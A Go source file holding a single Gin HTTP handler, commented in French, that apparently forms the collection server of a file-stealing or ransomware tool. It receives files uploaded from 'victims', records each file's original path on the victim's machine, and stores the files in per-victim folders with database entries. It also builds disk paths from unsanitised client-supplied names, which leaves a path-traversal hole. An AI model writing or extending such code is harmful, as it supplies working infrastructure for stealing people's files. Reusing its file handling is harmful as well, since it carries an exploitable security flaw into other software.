package handlers

import (
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"rw_local_go/db"
	"rw_local_go/models"
	"rw_local_go/repositories"
	"time"

	"github.com/gin-gonic/gin"
)

func AddFile(c *gin.Context) {
	log.Println("=== Début AddFile ===")

	// Récupérer le fichier uploadé
	file, header, err := c.Request.FormFile("file")
	if err != nil {
		log.Printf("Erreur récupération fichier: %v", err)
		c.JSON(http.StatusBadRequest, gin.H{"error": "Fichier requis"})
		return
	}
	defer file.Close()

	// Récupérer les champs additionnels
	filepathVictime := c.PostForm("filepathvictime")
	name := c.PostForm("name")
	password := c.PostForm("password")

	log.Printf("filepathvictime reçu: %s", filepathVictime)
	log.Printf("name reçu: %s", name)

	// Authentifier la victime
	victimeRepository := repositories.VictimeRepository{DB: db.DB}
	victime, err := victimeRepository.Authenticate(name, password)
	if err != nil {
		log.Printf("Erreur authentification: %v", err)
		c.JSON(http.StatusUnauthorized, gin.H{"error": "Authentification échouée"})
		return
	}

	// Créer le dossier files s'il n'existe pas
	uploadDir := "files"
	if err := os.MkdirAll(uploadDir, 0755); err != nil {
		log.Printf("Erreur création dossier: %v", err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Erreur serveur"})
		return
	}

	// Créer le dossier pour cette victime spécifique
	victimDir := filepath.Join(uploadDir, victime.Name)
	if err := os.MkdirAll(victimDir, 0755); err != nil {
		log.Printf("Erreur création dossier victime: %v", err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Erreur serveur"})
		return
	}

	// Générer un nom de fichier unique
	timestamp := time.Now().Unix()
	filename := fmt.Sprintf("%d_%s", timestamp, header.Filename)
	filepath := filepath.Join(victimDir, filename)

	// Créer le fichier sur le disque
	dst, err := os.Create(filepath)
	if err != nil {
		log.Printf("Erreur création fichier: %v", err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Erreur serveur"})
		return
	}
	defer dst.Close()

	// Copier le contenu du fichier
	_, err = io.Copy(dst, file)
	if err != nil {
		log.Printf("Erreur copie fichier: %v", err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Erreur serveur"})
		return
	}

	// Créer l'objet File
	fileModel := models.File{
		FileName:        header.Filename,
		FilePath:        filepath,
		FilePathVictime: filepathVictime,
		VictimeID:       victime.ID,
		FileSize:        header.Size,
		MimeType:        header.Header.Get("Content-Type"),
		CreatedAt:       time.Now().Format("2006-01-02 15:04:05"),
	}

	log.Printf("Fichier reçu: %+v", fileModel)

	fileRepository := repositories.FileRepository{DB: db.DB}
	log.Printf("DB pointer: %v", db.DB)

	if err := fileRepository.Create(&fileModel); err != nil {
		log.Printf("Erreur création fichier: %v", err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	log.Println("Fichier créé avec succès")
	c.JSON(http.StatusCreated, gin.H{
		"message": "Fichier ajouté",
		"file":    fileModel,
	})
}
